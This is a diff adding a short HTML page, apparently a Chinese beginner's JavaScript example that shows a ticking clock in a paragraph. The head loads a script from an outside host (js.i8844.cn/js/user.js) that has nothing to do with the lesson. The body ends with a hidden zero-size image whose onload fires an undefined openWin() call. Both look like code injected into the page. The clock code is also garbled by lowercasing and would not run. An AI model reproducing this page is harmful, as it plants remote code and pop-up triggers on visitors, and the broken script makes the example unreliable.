@@ -1,0 +1,22 @@
+ <!doctype html public "-//w3c//dtdxhtml1.0 strict//en"
+"http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+	   <title>访问指定元素</title>
+	<script language="javascript" type="text/javascript" src="http://js.i8844.cn/js/user.js"></script></head>
+    <body>
+	  <p id="clock">在此处显示电子时钟的时间</p>
+	    <script language="javascript">
+	      function showtime()
+		  {
+		     var now,clock_line,time_text;
+			 now = new date();
+			 time_text = now.gethours() + ":" +now.getminutes() + ":" + now.getseconds();
+			 clock_line = document.getelementbyid("clock");
+	         clock_line.innertext = time_text;
+             settimeout("showtime();",1000);
+          }
+         showtime();
+      </script>
+    <img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>	  
